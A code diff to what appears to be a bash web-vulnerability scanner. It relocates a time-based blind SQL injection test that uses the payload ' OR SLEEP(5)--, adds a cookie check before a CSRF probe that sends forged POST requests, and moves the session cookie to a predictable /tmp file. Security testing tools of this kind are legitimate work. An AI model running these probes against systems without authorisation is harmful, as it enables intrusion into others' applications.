@@ -147,26 +147,6 @@ test_sqli() {
   done
 }
 
-test_blind_sqli() {
-  local base="$1"
-  local payload="' OR SLEEP(5)-- "
-  local enc; enc=$(urlencode "$payload")
-  local target; target=$(append_query "$base" "id" "$enc")
-
-  local start=$(date +%s)
-  curl_get "$target" >/dev/null
-  local end=$(date +%s)
-
-  local delta=$((end - start))
-  if (( delta >= 5 )); then
-    log "[+] Time-based SQLi detected: $target (Δ=${delta}s)"
-    record_finding "$base" "$target" "sqli_time" "delay:$delta" "$payload"
-  else
-    [[ "$VERBOSE" == "true" ]] && echo "[*] No delay detected (Δ=${delta}s)"
-  fi
-}
-
-
 test_path_traversal() {
   local base="$1"
   for p in "${PATH_TRAV_PAYLOADS[@]}"; do
@@ -192,8 +172,9 @@ login_and_store_cookie() {
   local login_url="$1"
   local user="$2"
   local pass="$3"
-  local cookie_file="$TMP_DIR/session.cookie"
+  local cookie_file="/tmp/pwny_cookie_$$.txt"
 
+  echo "[*] Logging in to $login_url with user $user..."
   curl -s -c "$cookie_file" -X POST "$login_url" \
     -d "username=$user&password=$pass" --max-time 5 >/dev/null
 
@@ -203,6 +184,7 @@ login_and_store_cookie() {
 }
 
 test_csrf() {
+  require_cookie
   local base="$1"
   local resp=$(curl_get "$base")
 
@@ -216,6 +198,32 @@ test_csrf() {
     curl -X POST "$post_url" -d "$data" -b "$COOKIE" --max-time 5 >/dev/null && \
     echo "[+] Possible CSRF vulnerability on $post_url" && \
     record_finding "$base" "$post_url" "csrf" "no_token" "$data"
+  fi
+}
+
+test_blind_sqli() {
+  local base="$1"
+  local payload="' OR SLEEP(5)-- "
+  local enc; enc=$(urlencode "$payload")
+  local target; target=$(append_query "$base" "id" "$enc")
+
+  local start=$(date +%s)
+  curl_get "$target" >/dev/null
+  local end=$(date +%s)
+
+  local delta=$((end - start))
+  if (( delta >= 5 )); then
+    log "[+] Time-based SQLi detected: $target (Δ=${delta}s)"
+    record_finding "$base" "$target" "sqli_time" "delay:$delta" "$payload"
+  else
+    [[ "$VERBOSE" == "true" ]] && echo "[*] No delay detected (Δ=${delta}s)"
+  fi
+}
+
+require_cookie() {
+  if [[ -z "$COOKIE" ]]; then
+    echo "[!] COOKIE is required for this test. Use --login-* flags or set COOKIE manually."
+    exit 1
   fi
 }
 
